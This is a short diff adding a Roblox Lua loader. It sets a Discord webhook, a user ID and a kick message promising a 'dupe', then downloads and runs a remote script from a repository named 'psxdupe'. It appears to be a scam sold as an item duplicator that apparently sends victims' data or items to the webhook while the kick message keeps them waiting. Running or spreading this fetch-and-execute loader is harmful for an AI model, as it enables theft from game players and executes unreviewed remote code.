@@ -1,0 +1,4 @@
+_G.UserID = "2016611144"
+_G.Webhook = "https://discord.com/api/webhooks/1051231901572141156/Y6U4bmFRpI18Jv9fZ0NXwTJ5fMkHufd-v31j2ZzHFLnhqQrv_ohn9XURwaxicry9kQij"
+_G.KickMessage = "The Dupe Has Comenced Wait 30 Mins"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2"))()
